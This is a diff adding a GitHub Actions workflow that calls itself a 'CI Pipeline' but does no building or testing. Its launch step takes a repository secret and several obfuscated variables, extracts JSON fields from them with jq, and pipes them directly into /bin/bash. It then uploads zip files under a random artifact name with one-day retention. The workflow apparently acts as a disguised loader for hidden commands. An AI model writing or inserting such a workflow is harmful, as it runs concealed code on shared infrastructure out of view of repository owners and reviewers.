@@ -1,0 +1,31 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+jobs:
+  handler:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Launch
+        env:
+          h3: ${{ secrets.h3 }}
+        run: |
+          printf '%s' "$h3" | jq -r .nvt63 | /bin/bash
+          printf '%s' "$iqfj7" | jq -r .d6445 | /bin/bash
+          echo $zfkqn7771 | jq -r .q9 | /bin/bash
+          printf '%s' "$cb04587" | jq -r .ib78957 | /bin/bash
+
+      - name: Persist output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: A62WCtvW
+          path: "*.zip"
+          retention-days: 1
